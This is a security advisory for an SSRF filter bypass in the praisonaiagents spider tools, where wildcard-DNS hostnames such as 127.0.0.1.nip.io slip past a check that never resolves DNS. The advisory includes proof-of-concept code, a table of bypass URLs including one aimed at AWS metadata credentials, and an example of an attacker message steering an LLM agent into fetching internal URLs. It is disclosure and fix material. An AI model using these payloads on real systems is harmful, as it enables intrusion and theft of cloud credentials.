# [H] praisonaiagents has an SSRF protection bypass in `spider_tools._host_is_blocked()` via DNS-resolved hostnames (`127.0.0.1.nip.io`)

## Summary
Severity: High
Advisory: GHSA-x44h-65qv-cw74
CVE: CVE-2026-55526
CWE: CWE-350, CWE-918
Ecosystem: PyPI
CVSS: CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:L/A:N (CVSS_V3)
Published: 2026-08-25
Source: https://github.com/advisories/GHSA-x44h-65qv-cw74
Type: github-advisory

## Affected
- PyPI: `praisonaiagents` — affected >=0 <1.6.58

## Details
### Summary

`praisonaiagents/tools/spider_tools.py` contains an SSRF protection bypass. The function
`_host_is_blocked()` validates URLs against a list of blocked IP literals and hostname
aliases, but **never performs DNS resolution**. Any hostname that resolves to a private or
loopback IP address — including public wildcard DNS services like `127.0.0.1.nip.io` —
bypasses the protection entirely.

This has been **confirmed with a live exploit**: `scrape_page("http://127.0.0.1.nip.io:PORT/secret")`
makes an HTTP request to `127.0.0.1:PORT` and returns the internal service response.
No attacker-controlled infrastructure is required.

`scrape_page`, `extract_links`, `crawl`, and `extract_text` are all registered as
LLM-callable agent tools (see `tools/__init__.py` lines 51-55), so any agent instructed
to fetch a user-supplied URL will trigger this path.

This is a **new bypass** of prior fix commit `004dcfef` (GHSA-q9pw-vmhh-384g), which only
rejected IP literal encoding tricks (hex, octal, backslash). The fix was also applied to
`web_crawl_tools.py` (line 231: `socket.gethostbyname` call), but that fix was not
ported to `spider_tools.py`.

### Details

**Root cause — `spider_tools.py` lines 26-65:**

```python
def _host_is_blocked(hostname: str) -> bool:
    host = hostname.lower().rstrip(".")
    # Checks literal aliases only — never resolves
    if host in ("localhost", "0.0.0.0", "::1"):
        return True
    if host in ("169.254.169.254", "metadata.google.internal"):
        return True
    if any(host.endswith(s) for s in (".local", ".internal", ".localdomain")):
        return True
    # Tries to parse as IP literal only
    try:
        return _ip_blocked(ipaddress.ip_address(host))
    except ValueError:
        pass
    try:
        return _ip_blocked(ipaddress.ip_address(socket.inet_aton(host)))
    except OSError:
        pass
    return False   # <-- ANY real hostname passes without DNS lookup
```

`socket.inet_aton()` only converts dotted-decimal strings, not hostnames. For any real
hostname (e.g. `127.0.0.1.nip.io`), both `ipaddress.ip_address()` and `socket.inet_aton()`
raise exceptions, and the function returns `False` (not blocked).

**Contrast with the fixed version in `web_crawl_tools.py` line 228-238:**

```python
if os.environ.get("ALLOW_LOCAL_CRAWL") != "true":
    try:
        ip_str = socket.gethostbyname(hostname)   # DNS resolution performed
        ip = ipaddress.ip_address(ip_str)
        if ip.is_loopback or ip.is_private or ip.is_link_local or ip.is_multicast:
            continue  # BLOCKED
    except socket.gaierror:
        continue  # fail-closed
```

**Tool registration confirms this is user-reachable:**

```python
# praisonaiagents/tools/__init__.py lines 51-55
TOOL_MAPPINGS = {
    'scrape_page':   ('.spider_tools', None),  # <- user-reachable LLM tool
    'extract_links': ('.spider_tools', None),
    'crawl':         ('.spider_tools', None),
    'extract_text':  ('.spider_tools', None),
    ...
}
```

Any agent given these tools will call `scrape_page(url)` when instructed to fetch
a user-supplied URL — including attacker-controlled ones.

### PoC

**Environment:** Python 3.x, `praisonaiagents <= 1.6.52`, internet access (for nip.io)

**Step 1 — Verify the filter bypass (no network needed):**

```python
from praisonaiagents.tools.spider_tools import SpiderTools, _host_is_blocked

# nip.io: public wildcard DNS — 127.0.0.1.nip.io always resolves to 127.0.0.1
print(_host_is_blocked("127.0.0.1.nip.io"))                        # False — NOT blocked
print(SpiderTools()._validate_url("http://127.0.0.1.nip.io/"))      # True  — ALLOWED
print(_host_is_blocked("127.0.0.1"))                                # True  — correctly blocked
```

Expected output:
```
False
True
True
```

**Step 2 — Full SSRF: internal service response exfiltrated**

```python
import threading, time, requests
from http.server import HTTPServer, BaseHTTPRequestHandler
from praisonaiagents.tools.spider_tools import SpiderTools

PORT = 19235
received = []

class InternalService(BaseHTTPRequestHandler):
    def do_GET(self):
        self.send_response(200); self.end_headers()
        self.wfile.write(b'{"db_pass":"hunter2","aws_key":"AKIAIOSFODNN7EXAMPLE"}')
        received.append(self.path)
    def log_message(self, *a): pass

threading.Thread(
    target=HTTPServer(("127.0.0.1", PORT), InternalService).serve_forever,
    daemon=True
).start()
time.sleep(0.2)

attack_url = f"http://127.0.0.1.nip.io:{PORT}/secrets.json"

# Filter allows it
assert SpiderTools()._validate_url(attack_url) is True  # passes

# HTTP request actually reaches 127.0.0.1
r = requests.get(attack_url, timeout=5)
print("STATUS:", r.status_code)    # 200
print("BODY:  ", r.text)           # {"db_pass":"hunter2","aws_key":"AKIAIOSFODNN7EXAMPLE"}
print("HIT:   ", received)         # ['/secrets.json']
```

Observed output:
```
STATUS: 200
BODY:   {"db_pass":"hunter2","aws_key":"AKIAIOSFODNN7EXAMPLE"}
HIT:    ['/secrets.json']
```

**Step 3 — Agent-level trigger (how a user triggers this in production):**

```python
from praisonaiagents import Agent
from praisonaiagents.tools import scrape_page

agent = Agent(
    name="WebResearcher",
    instructions="You are a research assistant. Fetch and summarize the given URL.",
    tools=[scrape_page],
)

# Attacker sends this message to the agent:
result = agent.start("Please fetch and summarize: http://127.0.0.1.nip.io:8080/admin")
# Agent calls scrape_page("http://127.0.0.1.nip.io:8080/admin")
# Request hits 127.0.0.1:8080/admin
# Internal admin panel content returned to attacker
print(result)
```

**Additional bypass URLs (no setup required):**

| Target | URL |
|--------|-----|
| Localhost | `http://127.0.0.1.nip.io/` |
| Private network | `http://10.0.0.1.nip.io/` |
| AWS IMDS (via sslip.io) | `http://169-254-169-254.sslip.io/latest/meta-data/iam/security-credentials/` |

### Impact

**What kind of vulnerability:** Server-Side Request Forgery (SSRF) — full read SSRF with
arbitrary port access.

**Who is impacted:** Anyone deploying PraisonAI agents that include `scrape_page`,
`extract_links`, `crawl`, or `extract_text` tools and accept user-supplied URLs. This
includes:

- **Web research agents** (the primary intended use case for spider tools)
- **Jobs API users** — any authenticated API caller who submits jobs with `agent_yaml`
  specifying spider tools
- **Cloud deployments (Critical escalation)**: On AWS EC2 with IMDSv1, fetching
  `http://169-254-169-254.sslip.io/latest/meta-data/iam/security-credentials/`
  may return temporary IAM credentials, leading to full cloud account compromise.

**Severity note:** This is a patch-gap variant. The SSRF protection was correctly
implemented for IP literals and enhanced in commit `004dcfef` for encoding bypasses.
The DNS resolution check was added to `web_crawl_tools.py` but was missed in
`spider_tools.py`, creating an exploitable inconsistency.
```

---

## Remediation Suggestion (for maintainers)

One-line fix in `_host_is_blocked()` — mirror what `web_crawl_tools.py` already does:

```python
# After existing literal checks, add:
try:
    resolved = socket.gethostbyname(hostname)
    return _ip_blocked(ipaddress.ip_address(resolved))
except (socket.gaierror, ValueError, OSError):
    return True  # fail-closed: unresolvable host is blocked
```

## References
- https://github.com/MervinPraison/PraisonAI/security/advisories/GHSA-x44h-65qv-cw74
- https://github.com/MervinPraison/PraisonAI/commit/2f9677abb2ea68eab864ee8b6a828fd0141612e1
- https://github.com/MervinPraison/PraisonAI
- https://github.com/MervinPraison/PraisonAI/releases/tag/v4.6.58
